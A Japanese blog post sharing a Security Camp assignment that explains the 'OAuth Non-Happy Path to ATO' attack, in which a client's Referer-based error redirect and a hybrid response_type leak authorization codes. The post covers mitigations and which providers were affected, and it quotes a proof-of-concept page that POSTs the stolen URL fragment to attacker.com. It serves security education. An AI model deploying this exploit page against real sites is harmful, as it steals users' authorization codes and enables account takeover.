---
title: "【セキュキャン課題晒し】OAuth Non-Happy Path to ATOについて解説する"
emoji: "🛡️"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["seccamp", "セキュリティ", "OAuth", "脆弱性"]
published: true
---

# はじめに

こんにちは、calloc134 です。
つい先日、セキュリティキャンプにエントリーし、課題を提出しました。
https://x.com/calloc134/status/1930929321876852833

事前課題の中で、気になった攻撃テクニック事例を一つ選び、これを詳しく解説するというものがありました。
自分は OAuth/OIDC について勉強中のため、OAuth に関連する攻撃事例である「OAuth Non-Happy Path to ATO」を選びました。

詳しく調査したところ結構面白い内容だったので、OAuth の復習も兼ねて取り組みました。課題提出はおわりましたが、せっかく頑張ったレポート課題の内容を公開しないのはもったいない！と思い、課題晒しも兼ねて公開することに決めました。

「OAuth Non-Happy Path to ATO」について、自分の理解でまとめていきたいと思います。OAuth の基本的な知識があることを前提に、攻撃手法の詳細や、どのような脆弱性があるのかを解説していきます。

:::details 課題内容

こちらより引用しております。
https://www.ipa.go.jp/jinzai/security-camp/2025/camp/zenkoku/sbn8o1000000c4oy-att/kadai_b.txt

> ■ Q.4（Web に関連する脆弱性・攻撃技術の検証）
> 「Top 10 web hacking techniques of 2024」( https://portswigger.net/research/top-10-web-hacking-techniques-of-2024 ) は、Web に関するセキュリティリサーチャーの投票により作成された、2024 年に報告された興味深い Web に関する攻撃テクニック 10 選です。この Top 10 中の事例の中で、興味を持てたもの 1 つに関して、以下を説明してください。
> (1) 事例の概要
> (2) 攻撃手法の詳細
> (3) その他その事例に関して感じたこと・気がついたこと
> なお、本設問では、関連する仕様や攻撃の適用可能な条件についての詳細な理解が垣間見えるような記述や、理解を深めるために行ったこと（例: ローカルで行った再現実験等）に関する記述を歓迎します。

:::

# 前提

この攻撃手法を理解するためには、まず OAuth の具体的なフローを把握しておく必要があります。以前執筆したブログを参考にして、OAuth の基本的な流れを復習しておくと良いでしょう。
https://zenn.dev/calloc134/articles/5e8da6c491e720#oauth-の登場人物
https://zenn.dev/calloc134/articles/5e8da6c491e720#ざっくりとしたフロー

また、OAuth に対する攻撃に関連して必要な知識は、以下のとおりです。
https://zenn.dev/calloc134/articles/5e8da6c491e720#認可コードはどのように奪われるんでしょうか？-⏩
https://zenn.dev/calloc134/articles/5e8da6c491e720#奪われた認可コードはどのように使われるんでしょうか？⏩

なお、以降の文章はレポートの文体に合わせるため少し堅い表現になっていますが、ご了承ください。

# 攻撃手法の詳細

「OAuth Non-Happy Path to ATO」は、2024 年の Web Hacking Techniques Top 10 に選出された攻撃手法の一つである。この攻撃手法では、OAuth で認可(もしくは認証) を行う際にエラー処理のフローの実装の欠陥を悪用することにより、認可コードを盗むことができるというものである。

https://blog.voorivex.team/oauth-non-happy-path-to-ato

簡単に解説すると、エラーハンドリング時にリファラに対してリダイレクトする挙動を悪用し、攻撃者に認可コードを送信させるというものになる。この際、あえてエラーを引き起こすためにパラメータの一種であるレスポンスタイプを改竄し、パラメータの欠落を悪用してエラーを引き起こしている。

この攻撃事例の評価すべきポイントは、複数の欠陥が接続して一つの脆弱性となるチェーンが適切に組み建てられているところだと考えられる。技術的詳細について順を追って解説していく。

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731316422739/22f91017-78f6-4a99-89f6-9404c39598ed.png?auto=compress,format&format=webp)

# 攻撃の概要

この攻撃の最終的なゴールとしては、認可コードの奪取である。これを明確にしておく必要がある。

タイトルにもあるハッピーパスとは、例外・エラーが一切発生せず処理が完了するシナリオのことを指す。
これに対して非ハッピーパス(Non-Happy Path)とは、何らかの例外やエラーが発生し処理が正常終了しない場合のことを指す。この場合 OAuth クライアントはエラーのハンドリング処理を行うが、その挙動が不適切であると、攻撃者にとって有利な挙動となることがある。
![](https://cdn.hashnode.com/res/hashnode/image/upload/v1728073019425/15bb6644-8d22-4e1b-aa30-349ce7fe5f1c.png?auto=compress,format&format=webp)
_緑がハッピーパス、赤が非ハッピーパスであることを示す_

この事例では、OAuth クライアントが認可サーバからのレスポンスを受け取った際、何らかのエラーが発生したときに、HTTP のリファラヘッダを参照してリダイレクトを行う実装がされていることを悪用する。
HTTP のリファラは、フローの開始の際のリファラがそのまま保持される。したがって、攻撃者が罠サイトを用意し、罠サイト内部の JavaScript を利用して`window.open`などで OAuth の認可フローを開始するように実装することで、当該罠サイトを踏んだ被害者がフローを開始してエラーを発生させた場合にリファラである罠サイトにリダイレクトされることになる。
![](https://cdn.hashnode.com/res/hashnode/image/upload/v1728063263872/31c22ade-2cc5-40e8-b2a6-2a5bfe3e7e00.png?auto=compress,format&format=webp)
_`attacker.com`で`window.open`を使ってフローを開始すれば、リファラが保持される_

次に、OAuth クライアントに対してわざとエラーを発生させる方法について解説していく。
注意しておきたいのは、OAuth クライアントがエラーのハンドリングを行うようにしたいということである。つまり、認可サーバはエラーなしに処理が完了する。

今回のケースでは、OAuth クライアントが認可サーバから受け取るレスポンスのパラメータの欠落を悪用している。
フローを開始する際の URL のパラメータを確認すると`response_type`は多くの場合`code`のように指定されている。これは認可コードフローであり、認可サーバから認可コードのみが返却される最も一般的なレスポンスタイプである。しかしこの URL を改竄し、`response_type=code,id_token`のように複数のレスポンスタイプを指定することで、認可サーバから認可コードに加え ID トークンが返却されるフローである「ハイブリッドフロー」を開始することができる。
このフローの特徴として、および認可コードが`&code=...`のようなクエリパラメータではなく、
`#code=...&id_token=...`のようにフラグメントで返却されるという点がある。この仕様により、OAuth クライアントは認可サーバからのレスポンスを分析しても認可コードを見つけられないため、エラーを発生させることができる。
![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731315515124/9c915fad-3da2-41d0-9c40-e0f5ece14705.png?auto=compress,format&format=webp)
_図では response_type の内容が違うが<br />インプリシット・ハイブリッドではフラグメントでレスポンスが返却されることを示している_

以上のカラクリにより、攻撃が可能となった。

攻撃のフローについて示す。
まず攻撃者は、悪意のある javascript を含んだ罠サイトをホストする必要がある。ブログより引用する。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Attacker Website</title>
  </head>
  <body>
    <input type="button" value="exploit" onclick="exploit()" />
    <script>
      function exploit() {
        window.open(
          "https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=https://target.com/api/v1/oauth/google/callback/login&scope=https://www.googleapis.com/auth/userinfo.profile%20https://www.googleapis.com/auth/userinfo.email&state=&response_type=id_token,code&prompt=none",
          "",
          "width=10, height=10"
        );
      }

      window.addEventListener("load", () => {
        const fragment = window.location.hash;
        if (fragment) {
          const encodedFragment = encodeURIComponent(fragment);
          fetch("https://attacker.com/save_tokens", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: `${encodedFragment}`,
          });
        }
      });
    </script>
  </body>
</html>
```

`window.open`を利用して、`id_token`と`code`の両方をレスポンスタイプで要求していることを確認することができる。

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731316422739/22f91017-78f6-4a99-89f6-9404c39598ed.png?auto=compress,format&format=webp)
_簡略化された攻撃のフロー_

次に、被害者が攻撃者の仕掛けたウィンドウを開く。すると OAuth のフローが開始され、認可サーバにリクエストが送信される。認可サーバは`redirect_uri`を確認するが、これは正規のものなので検証には成功する。

続けて認可サーバは認可コードと ID トークンをリダイレクト先に返す。
OAuth クライアントはレスポンスを解析するが、返却されたクエリの中に`code`パラメータが存在せず、先程のように例外が発生する。したがってリファラに対してリダイレクトを行う。

ここで元のブログ記事では、サーバサイドでリダイレクトを行った場合、フラグメント部分が除去されずリダイレクト先に保持されるということを指摘している。これにより、遷移先である攻撃者のサーバにフラグメント情報付きでリダイレクトされることになり、攻撃者は認可コードを受け取ることができる。
![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731315330876/4eb0b89d-52fe-4aea-908c-3248c31b344d.png?auto=compress,format&format=webp)

> There are two common ways to redirect users: server-side and client-side. In the first method, when a user is redirected to another website, the fragment part of the URL remains unchanged, however, in a client-side redirect, the fragment part of the URL is removed with each redirect:

以上のように、攻撃者は認可コードを受け取ることができる。

この攻撃は一つの脆弱性ではなく、複数の欠陥が組み合わさって一つの脆弱性となっていることに注意が必要である。原因を分析すると、以下のようになる。

## 認可サーバが`response_type`にハイブリッドフローを許容している

当攻撃は、認可サーバが`response_type`に`id_token,code`のようなハイブリッドフローを許容していることが前提となる。もし認可サーバがこのレスポンスタイプを許容していない場合、攻撃は成立しない。
認可サーバで認可コードフロー以外を利用しない場合、設定からインプリシットフロー・ハイブリッドフローの設定を無効化すべきである。

## OAuth クライアントがリファラを参照してリダイレクトを行う実装になっている

OAuth クライアントが認可サーバからのレスポンスを受け取った際に、何らかのエラーが発生した場合にリファラを参照してリダイレクトを行う実装になっていることも原因となる。リファラによってリダイレクトする仕組みを避けるか、リファラを保持するプロパティを受け付けないようにする等を検討するべきである。
なお、リファラが保持されるためには`prompt=none`プロパティによりログイン画面を一切表示せずに認可フローを完了させるようなオプション指定が必要であるが、ユーザビリティに影響がない場合はこのオプションを無効化することも検討するべきである。

## ~~フロー開始時に OAuth クライアント側で`response_type`の検証を行っていない~~

~~OAuth クライアントがフロー開始のリクエストをユーザから受けた際に、意図しない`response_type`が指定されていないか検証を行っていないことも原因となる。今回の場合は`code`のみを許可し、それ以外を拒否するように実装しておくことで攻撃を防ぐことができる。ホワイトリスト式の検証であることが好ましい。~~

この部分については、今回の事例では OAuth クライアントがフローを開始している訳ではないためクライアントが検証を行うことができない点に注意する。
ritou さん、ご指摘ありがとうございました。
https://zenn.dev/calloc134/articles/seccamp-kadai-q4#comment-7204a2372178c1

最後に、Facebook/GitHub/Google の各プロバイダにおいて、この脆弱性が有効であったかどうかについての分析を行う。

## Facebook

Facebook の OAuth フローにおいては確認画面が表示され、リファラが保持されなかった。したがって攻撃者がリファラを指定して罠サーバにリダイレクトすることができなかったため、攻撃は成立しなかった。

## GitHub

そもそも`response_type`に`id_token,code`のようなハイブリッドフローを許容していなかったため、攻撃は成立しなかった。

## Google

結論からいうと、Google の OAuth フローにおいては攻撃が成立した。
`response_type`に`id_token,code`のようなハイブリッドフローを許容しており、リファラを保持するプロパティも受け付けていたため、攻撃者が罠サーバにリダイレクトすることが可能であった。

# その他その事例に関して感じたこと・気がついたこと

当該攻撃に関して、特に留意しておくべき点を提示する。

## `redirect_uri`の検証について

OAuth のオープンリダイレクト攻撃対策としては`redirect_uri`の検証がよく知られているが、今回はこちらのパラメータは攻撃に関連してこないため、検証を行うことで攻撃を防ぐことはできないことに注意が必要である。

## 認可コードの盗難後のフローについて

この攻撃の最終的な到達点としては、認可コードを奪取することにある。つまり、認可コードを盗んだ後の攻撃については考慮をしていないことに注意が必要である。いわば、上記の記事で解説した「認可コードを盗む攻撃」の一種である。
認可コードを盗んだとしても、PKCE などの機構によって認可コードがアクセストークンに引き換えられない場合、攻撃者は認可コードを利用してアクセストークンを取得することができないため被害の拡大を防ぐことができる。
PKCE の詳細に関しては、以下のブログ記事を参照していただきたい。
https://zenn.dev/calloc134/articles/5e8da6c491e720#奪われた認可コードはどのように使われるんでしょうか？⏩

## レスポンスタイプの指定について

先程の事例では`response_type`に`id_token,code`を指定している。この組み合わせのハイブリッドフローとは別に、`token,code`の組み合わせも考えられる。
しかし、アクセストークンを取得するハイブリッドフローについては危険性が高く、多くの認可サーバで非推奨になっている。これは、アクセストークンのインプリシットフローが非推奨になっていることと同じ理由である。一方、`id_token,code`の組み合わせは、ID トークンを取得するためのハイブリッドフローであり、ID トークンのインプリシットフローは危険視されていないため、こちらの組み合わせは許容されていることが多い。この部分は脆弱性の解説からそれるため詳しくは解説しないが、注意しておく必要がある。

# まとめ

今回は、「OAuth Non-Happy Path to ATO」という攻撃手法について解説しました。OAuth のフローにおいてクライアントのエラーハンドリング実装の欠陥を悪用し、認可コードを盗むという攻撃手法でした。
今回の記事に関する情報ならびに画像リソースは、以下のブログ記事より引用しております。
https://blog.voorivex.team/oauth-non-happy-path-to-ato

このような攻撃手法では、認可サーバ・クライアントのどちらが悪いと言い切ることができず、単体では問題のないような実装が組み合わさることで脆弱性となっていると感じました。自分が現在進行系で勉強中の OAuth に関する攻撃手法をしっかり学ぶことができ、非常に有意義な調査となりました。
このレポートが、OAuth の攻撃手法の理解を深める一助となれば幸いです。もし理解が不十分な点、誤りがあればご指摘いただけると幸いです。
最後に、セキュリティキャンプ合格しますように！
